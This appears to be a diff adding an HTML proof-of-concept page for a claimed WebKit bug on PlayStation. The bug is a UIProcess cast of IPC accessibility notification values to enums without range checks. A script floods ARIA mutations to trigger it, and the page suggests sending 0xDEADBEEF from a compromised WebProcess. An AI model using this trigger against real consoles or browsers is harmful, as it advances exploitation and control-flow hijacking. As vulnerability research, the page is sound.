@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Accessibility Enum OOB — PoC trigger</title>
+<style>
+body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
+.info { color: #0ff; }
+pre { white-space: pre-wrap; }
+</style>
+</head>
+<body>
+<h2>IPC Accessibility Notification — Enum Range Bug</h2>
+<pre class="info">
+BUG: WebPageProxy::accessibilityNotification() (WebPageProxyPlayStation.cpp:125)
+receives uint32_t `notification` via IPC from the WebProcess.
+It casts it to AXObjectCache::AXNotification without range validation:
+
+  static_cast&lt;WebCore::AXObjectCache::AXNotification&gt;(notification)
+
+Then passes it to toAPI() (WebViewAccessibilityClient.cpp) which
+has a switch() with NO default: branch — undefined behavior if the
+value is out of enum range.
+
+SAME PATTERN for:
+  - accessibilityTextChange  (line 150) → AXTextChange enum
+  - accessibilityLoadingEvent (line 164) → AXLoadingEvent enum
+
+IMPACT:
+  A compromised WebProcess can send arbitrary uint32 values via the
+  AX IPC messages. The missing validation in UIProcess causes UB
+  that could lead to info-leak or control-flow hijack via the
+  uninitialized return value.
+
+TRIGGER:
+  This PoC generates rapid accessibility tree mutations via ARIA
+  attribute changes, which will generate AXNotification IPC messages.
+  On PS5, monitor klog for unexpected behavior when AX is enabled.
+
+  For a direct test from a compromised WebProcess: send
+  Messages::WebPageProxy::AccessibilityNotification(data, 0xDEADBEEF)
+  and observe UIProcess behavior.
+</pre>
+<hr>
+<div id="target" role="application" aria-label="test" tabindex="0">
+    <div id="live" aria-live="polite" aria-atomic="true">initial</div>
+    <div id="list" role="listbox">
+        <div id="opt1" role="option" aria-selected="true">Option 1</div>
+        <div id="opt2" role="option" aria-selected="false">Option 2</div>
+    </div>
+    <input id="input" type="text" aria-label="test input" value="">
+    <button id="btn" aria-expanded="false" aria-haspopup="true">Menu</button>
+    <div id="desc" aria-describedby="input" aria-busy="false">Description</div>
+</div>
+<div id="log" style="max-height:60vh;overflow:auto;font-size:11px;"></div>
+
+<script>
+"use strict";
+const logEl = document.getElementById('log');
+function log(msg) {
+    logEl.textContent += msg + '\n';
+    logEl.scrollTop = logEl.scrollHeight;
+}
+
+// Generate rapid AX mutations to flood IPC with accessibility messages
+// Each mutation generates different AXNotification types
+const mutations = [
+    // AXChildrenChanged
+    () => { const d = document.createElement('div'); d.role='option'; d.textContent='new'; document.getElementById('list').appendChild(d); setTimeout(()=>d.remove(),10); },
+    // AXFocusedUIElementChanged
+    () => { document.getElementById('input').focus(); setTimeout(()=>document.getElementById('btn').focus(),5); },
+    // AXValueChanged
+    () => { document.getElementById('input').value = 'test' + Math.random(); document.getElementById('input').dispatchEvent(new Event('input')); },
+    // AXSelectedStateChanged / AXSelectedChildrenChanged
+    () => { document.getElementById('opt1').setAttribute('aria-selected', 'false'); document.getElementById('opt2').setAttribute('aria-selected', 'true');
+            setTimeout(()=>{document.getElementById('opt1').setAttribute('aria-selected','true');document.getElementById('opt2').setAttribute('aria-selected','false');},5); },
+    // AXExpandedChanged
+    () => { const b=document.getElementById('btn'); b.setAttribute('aria-expanded', b.getAttribute('aria-expanded')==='true'?'false':'true'); },
+    // AXLiveRegionChanged
+    () => { document.getElementById('live').textContent = 'update ' + Math.random(); },
+    // AXElementBusyChanged
+    () => { const d=document.getElementById('desc'); d.setAttribute('aria-busy', d.getAttribute('aria-busy')==='true'?'false':'true'); },
+    // AXCheckedStateChanged
+    () => { const cb=document.createElement('input'); cb.type='checkbox'; cb.checked=true; document.getElementById('target').appendChild(cb); cb.checked=false; setTimeout(()=>cb.remove(),10); },
+    // AXRoleChanged — changing role attribute rapidly
+    () => { const d=document.getElementById('desc'); const roles=['alert','status','log','marquee','timer','note','region','article'];
+            d.setAttribute('role', roles[Math.floor(Math.random()*roles.length)]); },
+    // AXTextChanged
+    () => { const d=document.getElementById('live'); const t=document.createTextNode(' extra'); d.appendChild(t); setTimeout(()=>t.remove(),10); },
+];
+
+let count = 0;
+function runMutation() {
+    const m = mutations[Math.floor(Math.random() * mutations.length)];
+    try { m(); } catch(e) {}
+    count++;
+    if (count % 100 === 0) log(`${count} AX mutations fired`);
+}
+
+log('Starting AX mutation flood — monitor klog for crashes');
+log('Each mutation generates IPC messages to UIProcess');
+log('If AX is enabled, UIProcess receives uint32→enum casts without validation');
+log('');
+
+// Run at high frequency
+setInterval(runMutation, 2);
+// Also batch them
+setInterval(() => { for(let i=0;i<10;i++) runMutation(); }, 50);
+</script>
+</body>
+</html>
